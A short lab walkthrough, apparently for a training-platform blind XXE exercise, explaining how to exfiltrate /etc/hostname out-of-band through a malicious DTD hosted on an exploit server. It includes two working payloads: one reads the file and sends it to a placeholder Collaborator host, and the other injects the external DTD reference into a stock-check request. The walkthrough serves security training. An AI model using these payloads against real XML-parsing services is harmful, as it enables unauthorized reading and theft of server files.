*This information is only for the purposes of education and skills development.*

**Objective**
Exfiltrate contents of /etc/hostname file in Collaborator using malicious DTD or Document Type Definition file. 

**Blind XXE**
- XML External Entity Injection or XXE injection vulnerability allows attacker to interfere with an application's processing of external data that is in XML format. 
- Document Type Definition or DTD file defines rules for XML documents.
- In blind XXE, no values associated with external entities are returned in response.

**Point of Entry**
- On any product page, the *Check Stock* function issues a POST request.
- This request is our point of entry because it includes stockCheck element which handles XML data.

**Barrier to entry** 
- As no XML is present in response, XML parsing is considered out-of-band meaning that a separate channel of communication is in use.

**Bypassing Barrier to Entry**
- Out-of-band communication can be viewed using Collaborator. 
- Our XML based Collaborator template payload number one will be hosted on exploit server as a DTD file. 
- View exploit and copy page URL as this is the DTD URL.
- Start intercept and check stock to issue related POST request. Between XML declaration and `stockCheck` element, add payload number two including the DTD URL. Forward request.
- Collaborator will show a HTTP request containing the contents of the `/etc/hostname` file.

**Template Payload**
1. `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`
2. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
`

`


